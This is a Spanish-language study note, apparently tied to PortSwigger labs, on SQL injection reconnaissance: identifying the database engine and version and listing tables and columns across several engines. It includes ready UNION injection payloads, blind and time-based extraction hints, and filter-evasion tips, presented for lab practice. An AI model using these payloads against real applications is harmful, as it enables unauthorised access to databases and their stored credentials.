# Examinar la base de datos en ataques SQLi


## Resumen

Para explotar una vulnerabilidad de SQL injection es muy útil conocer el **tipo y la versión** del gestor de base de datos (SGBD) y **qué tablas y columnas** existen. Con esta información podemos construir payloads más precisos (por ejemplo `UNION SELECT` con el número correcto de columnas o funciones específicas del motor) y estimar el impacto.

Este documento muestra consultas típicas para identificar la versión y para enumerar tablas y columnas, con variantes para MySQL, Microsoft SQL Server, PostgreSQL, Oracle y SQLite.

[SQLi Cheat Sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)

---

## Identificar el tipo y la versión de la base de datos

Una forma común de identificar el SGBD es inyectar consultas específicas del proveedor que devuelvan la versión. Si la consulta funciona y devuelve datos, podemos inferir el motor y la versión.

### Consultas típicas por SGBD

* **Microsoft SQL Server / MySQL**

  ```sql
  SELECT @@version;
  ```

* **Oracle**

  ```sql
  SELECT * FROM v$version;
  ```

* **PostgreSQL**

  ```sql
  SELECT version();
  ```

* **SQLite**

  ```sql
  SELECT sqlite_version();
  ```

### Ejemplo con UNION

Si la aplicación permite `UNION` y la salida de la consulta se muestra en la página, puedes usar un payload como:

```
' UNION SELECT @@version--
```

Si la respuesta contiene algo como:

```
Microsoft SQL Server 2016 (SP2) (KB4052908) - 13.0.5026.0 (X64)
... Standard Edition (64-bit) on Windows Server 2016 ...
```

entonces confirmas que el motor es Microsoft SQL Server y puedes ajustar payloads posteriores.

[Lab: SQL injection attack, querying the database type and version on Oracle](1_SQL_injection_attack,_querying_the_database_type_and_version_on_Oracle.md)  

![Practitioner](https://img.shields.io/badge/level-Apprentice-blue)  

[Lab: SQL_injection_attack,_querying_the_database_type_and_version_on_MySQL_and_Microsoft](2_SQL_injection_attack,_querying_the_database_type_and_version_on_MySQL_and_Microsoft.md)  

![Practitioner](https://img.shields.io/badge/level-Apprentice-blue)  

---

## Listar el contenido de la base de datos (tablas y columnas)

La mayoría de SGBD (excepto Oracle, que usa diccionarios específicos) implementan `information_schema`, un conjunto de vistas que describen metadatos (tablas, columnas, etc.). Consultar `information_schema` es una forma portátil de enumerar tablas/columnas en MySQL, PostgreSQL y SQL Server.

### Listar tablas (information_schema)

Consulta genérica (funciona en MySQL, PostgreSQL, SQL Server donde exista `information_schema`):

```sql
SELECT table_catalog, table_schema, table_name, table_type
FROM information_schema.tables
WHERE table_type = 'BASE TABLE'
ORDER BY table_schema, table_name;
```

**Salida de ejemplo:**

```
TABLE_CATALOG  TABLE_SCHEMA  TABLE_NAME  TABLE_TYPE
MyDatabase     dbo           Products    BASE TABLE
MyDatabase     dbo           Users       BASE TABLE
MyDatabase     dbo           Feedback    BASE TABLE
```

Esto indica que existen tres tablas: `Products`, `Users` y `Feedback`.

### Listar columnas de una tabla

Consulta genérica usando `information_schema.columns`:

```sql
SELECT table_catalog, table_schema, table_name, column_name, data_type
FROM information_schema.columns
WHERE table_name = 'Users'
ORDER BY ordinal_position;
```

**Salida de ejemplo:**

```
TABLE_CATALOG  TABLE_SCHEMA  TABLE_NAME  COLUMN_NAME  DATA_TYPE
MyDatabase     dbo           Users       UserId       int
MyDatabase     dbo           Users       Username     varchar
MyDatabase     dbo           Users       Password     varchar
```

Con esto conoces las columnas y sus tipos.

---

## ¿Y Oracle? — vistas del diccionario

Oracle no siempre expone `information_schema`. En su lugar dispone de vistas como `ALL_TABLES`, `USER_TABLES`, `ALL_TAB_COLUMNS`, `USER_TAB_COLUMNS`.

* Listar tablas accesibles:

  ```sql
  SELECT owner, table_name FROM all_tables;
  -- o para sólo las del usuario actual:
  SELECT table_name FROM user_tables;
  ```

* Listar columnas de una tabla (ej. `USERS`):

  ```sql
  SELECT column_name, data_type FROM all_tab_columns WHERE table_name = 'USERS';
  ```

---

## Consejos prácticos para labs y explotación

1. **Haz fingerprint antes de lanzar payloads ruidosos.** Si sabes que es MySQL puedes usar `GROUP_CONCAT`, `CONCAT`, `SLEEP` (MySQL) o `LOAD_FILE()`; si es PostgreSQL usarás `string_agg`, `pg_sleep`, etc.
2. **Si la app no muestra resultados directamente, usa `UNION` para inyectar resultados en una columna visible.** Primero determina número de columnas con `ORDER BY`/`UNION SELECT NULL,...`.
3. **Si no puedes usar `UNION`, recurre a inyección ciega (boolean/time-based)** y extrae información carácter a carácter con `SLEEP`/`pg_sleep`/`WAITFOR` según el motor.
4. **En Oracle, usa `all_tables` / `all_tab_columns`** para enumerar objetos; muchas apps en labs tienen estas vistas accesibles y devuelven resultados.
5. **Evita enviar consultas destructivas en entornos reales.** En labs puedes experimentar, pero en producción no modifiques ni borres datos sin autorización.

---

## Payloads conceptuales (ejemplos adaptables)

> Ajusta cada payload al parámetro vulnerable y a la estructura de la respuesta de la aplicación.

* **Detectar versión (UNION)**

  * `' UNION SELECT @@version--` (MySQL / SQL Server)
  * `' UNION SELECT version()--` (Postgres / MySQL)
  * `' UNION SELECT * FROM v$version--` (Oracle, si se devuelve)

* **Listar tablas (information_schema)**

  * `' UNION SELECT table_schema, table_name, NULL, NULL FROM information_schema.tables--`

* **Listar columnas de `Users`**

  * `' UNION SELECT column_name, data_type, NULL, NULL FROM information_schema.columns WHERE table_name='Users'--`

* **Oracle — listar tablas**

  * `' UNION SELECT owner, table_name, NULL FROM all_tables--`

---

## Notas sobre salida y formateo

* Muchas veces debes **concatenar columnas** o usar funciones de agregación (`GROUP_CONCAT`, `string_agg`) para que los resultados quepan en una sola columna que la página muestre.
* Ajusta el número de columnas y tipos en `UNION SELECT` para que coincida con la consulta original.
* Si la aplicación filtra caracteres (por ejemplo `'` o `--`), intenta técnicas de evasión (comentarios, codificaciones, funciones nativas del motor) o usa herramientas como Burp para manipular encodings.

---

## Ejercicios de laboratorio sugeridos (Practitioner)

* **Oracle — query de versión y listados:** encontrar si `SELECT * FROM v$version` devuelve datos y luego listar tablas con `all_tables`.
* **MySQL / SQL Server — identificar versión con `@@version` y luego enumerar tablas con `information_schema.tables`**.
* **PostgreSQL — `SELECT version()` y enumerar con `pg_catalog`**.

Incluye siempre evidencias (requests, responses, capturas) en el writeup.

---

